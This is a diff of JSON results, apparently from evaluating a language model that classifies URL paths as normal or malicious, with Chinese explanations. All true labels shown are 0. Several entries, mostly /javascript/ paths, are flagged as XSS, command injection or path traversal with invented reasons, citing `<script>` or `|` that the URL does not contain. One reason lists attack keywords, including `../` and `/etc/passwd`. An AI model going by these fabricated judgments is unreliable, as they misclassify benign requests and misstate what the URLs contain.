+    "reason": "- 0 表示正常URL\n\nURL: /associatedcontent/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.734,
+    "raw_response": "- 0 表示正常URL\n\nURL: /associatedcontent/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/5991-0722/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /5991-0722 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.692,
+    "raw_response": "- 0 表示正常URL\n\nURL: /5991-0722 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/b2b.o",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征。此外，URL中没有参数值，也没有其他恶意特征。",
+    "elapsed_time_sec": 1.396,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript`关键字，这属于XSS攻击特征。此外，URL中没有参数值，也没有其他恶意特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/genomics/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /genomics/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.992,
+    "raw_response": "- 0 表示正常URL\n\nURL: /genomics/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/yongfa/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /yongfa/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.049,
+    "raw_response": "- 0 表示正常URL\n\nURL: /yongfa/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/046077/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /046077 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.699,
+    "raw_response": "- 0 表示正常URL\n\nURL: /046077 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cgi-home/printenv.tmp",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/cgi-home/printenv.tmp`，其中`printenv`是一个常见的命令执行路径，可能用于执行远程命令。此外，`tmp`可能暗示了潜在的文件包含或路径遍历风险。因此，该URL存在恶意攻击特征。",
+    "elapsed_time_sec": 2.132,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/cgi-home/printenv.tmp`，其中`printenv`是一个常见的命令执行路径，可能用于执行远程命令。此外，`tmp`可能暗示了潜在的文件包含或路径遍历风险。因此，该URL存在恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/237884539_2849c27e29/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/237884539_2849c27e29/`）",
+    "elapsed_time_sec": 1.334,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/237884539_2849c27e29/`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/apachemanual/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.97,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/q75647695",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /q75647695 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.801,
+    "raw_response": "- 0 表示正常URL\n\nURL: /q75647695 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1234000263054348/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.976,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/142249/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /142249 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.634,
+    "raw_response": "- 0 表示正常URL\n\nURL: /142249 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tvsquadpodcastfinal/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.943,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/taunus/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /taunus 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.02,
+    "raw_response": "- 0 表示正常URL\n\nURL: /taunus 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/blad_zinio1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /blad_zinio1/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.379,
+    "raw_response": "- 0 表示正常URL\n\nURL: /blad_zinio1/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/parliamentary_copyright/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.953,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/1991.log",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/1991.log`，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，`/javascript`路径包含恶意代码，属于路径遍历攻击。",
+    "elapsed_time_sec": 2.154,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/1991.log`，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，`/javascript`路径包含恶意代码，属于路径遍历攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/elitserien/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /elitserien 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.75,
+    "raw_response": "- 0 表示正常URL\n\nURL: /elitserien 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/127180/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /127180 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.614,
+    "raw_response": "- 0 表示正常URL\n\nURL: /127180 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2006_regionals/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /2006_regionals/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.927,
+    "raw_response": "- 0 表示正常URL\n\nURL: /2006_regionals/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/179117/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /179117 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.619,
+    "raw_response": "- 0 表示正常URL\n\nURL: /179117 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/m2l2k_28/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.002,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/dj playboy the trance of love/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含“playboy”和“the trance of love”等非标准路径，且未包含任何SQL注入、XSS、命令执行、路径遍历等攻击特征。因此，该URL属于异常URL。",
+    "elapsed_time_sec": 1.829,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含“playboy”和“the trance of love”等非标准路径，且未包含任何SQL注入、XSS、命令执行、路径遍历等攻击特征。因此，该URL属于异常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/foo.shtml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.324,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/webcgi.tar",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 1.005,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/042068/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /042068 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.631,
+    "raw_response": "- 0 表示正常URL\n\nURL: /042068 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/about6/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /about6/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.805,
+    "raw_response": "- 0 表示正常URL\n\nURL: /about6/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/businessobjectsxi/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /businessobjectsxi/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.799,
+    "raw_response": "- 0 表示正常URL\n\nURL: /businessobjectsxi/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ayb-astro/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.969,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/749746p1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /749746p1/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.473,
+    "raw_response": "- 0 表示正常URL\n\nURL: /749746p1/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20051110-5/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20051110-5 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.843,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20051110-5 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/n_banner/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /n_banner/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.752,
+    "raw_response": "- 0 表示正常URL\n\nURL: /n_banner/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/flag-eng/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /flag-eng/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.162,
+    "raw_response": "- 0 表示正常URL\n\nURL: /flag-eng/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tcpdump2ascii/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tcpdump2ascii/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.83,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tcpdump2ascii/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1111831186/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /1111831186 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.084,
+    "raw_response": "- 0 表示正常URL\n\nURL: /1111831186 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/msg27524958/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /msg27524958 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "elapsed_time_sec": 1.479,
+    "raw_response": "- 0 表示正常URL\n\nURL: /msg27524958 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/product.xslt",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "elapsed_time_sec": 1.315,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/forums.xml",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`|`、`;`、`&&`、`shell`、`../`、`/etc/passwd`等恶意特征。",
+    "elapsed_time_sec": 2.529,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS、SQL注入、命令执行、路径遍历等  \n- 恶意特征：包含`<script>`、`javascript:`、`union`、`select`、`|`、`;`、`&&`、`shell`、`../`、`/etc/passwd`等恶意特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/428874/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /428874 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.571,
+    "raw_response": "- 0 表示正常URL\n\nURL: /428874 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ie.stackdump",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，可能被用来执行恶意命令或窃取数据。",
+    "elapsed_time_sec": 1.397,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，可能被用来执行恶意命令或窃取数据。",
+    "true_label": "0"
+  },
+  {
+    "url": "/acrobat-8/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /acrobat-8 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.547,
+    "raw_response": "- 0 表示正常URL\n\nURL: /acrobat-8 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/w_pg05c2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.991,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/lights-out/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /lights-out/ 是一个合法的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.071,
+    "raw_response": "- 0 表示正常URL\n\nURL: /lights-out/ 是一个合法的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/iss_39/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /iss_39/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.019,
+    "raw_response": "- 0 表示正常URL\n\nURL: /iss_39/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/components.pfx",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 1.042,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/matilda1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /matilda1/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.563,
+    "raw_response": "- 0 表示正常URL\n\nURL: /matilda1/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/gilmore_amicus/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /gilmore_amicus/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.587,
+    "raw_response": "- 0 表示正常URL\n\nURL: /gilmore_amicus/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/msg87697/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /msg87697/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.811,
+    "raw_response": "- 0 表示正常URL\n\nURL: /msg87697/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/omegaconstellationpiepan/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /omegaconstellationpiepan/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.552,
+    "raw_response": "- 0 表示正常URL\n\nURL: /omegaconstellationpiepan/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/share.err",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript:`, 说明存在XSS攻击特征，且包含恶意脚本，属于典型的XSS攻击。",
+    "elapsed_time_sec": 1.241,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript:`, 说明存在XSS攻击特征，且包含恶意脚本，属于典型的XSS攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1004359386/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /1004359386 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.927,
+    "raw_response": "- 0 表示正常URL\n\nURL: /1004359386 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/kgc2005/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /kgc2005/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.874,
+    "raw_response": "- 0 表示正常URL\n\nURL: /kgc2005/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ma.cfm",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ma.cfm`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。此外，路径包含`/javascript/`，这属于路径遍历攻击的特征。",
+    "elapsed_time_sec": 2.191,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ma.cfm`路径，这属于典型的XSS攻击特征，因为JavaScript代码可能被恶意注入到页面中，从而执行恶意脚本。此外，路径包含`/javascript/`，这属于路径遍历攻击的特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20050207_facebook/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20050207_facebook/\n\n判断理由：该URL是合法的Web请求，包含正常路径和静态资源访问，参数值为业务数据，符合标准的HTTP请求格式。没有检测到任何恶意攻击特征。",
+    "elapsed_time_sec": 1.848,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20050207_facebook/\n\n判断理由：该URL是合法的Web请求，包含正常路径和静态资源访问，参数值为业务数据，符合标准的HTTP请求格式。没有检测到任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tracker061202/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tracker061202 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "elapsed_time_sec": 1.832,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tracker061202 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，该URL判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/pantyhose-sex/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.923,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/orleanist/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /orleanist/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.711,
+    "raw_response": "- 0 表示正常URL\n\nURL: /orleanist/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/starwalk-bounce/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /starwalk-bounce/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.744,
+    "raw_response": "- 0 表示正常URL\n\nURL: /starwalk-bounce/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/sell.cnf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，存在跨站脚本攻击风险。",
+    "elapsed_time_sec": 1.303,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含恶意脚本代码，存在跨站脚本攻击风险。",
+    "true_label": "0"
+  },
+  {
+    "url": "/conversionorperversion/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /conversionorperversion/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。请求格式正确，参数值为正常业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.019,
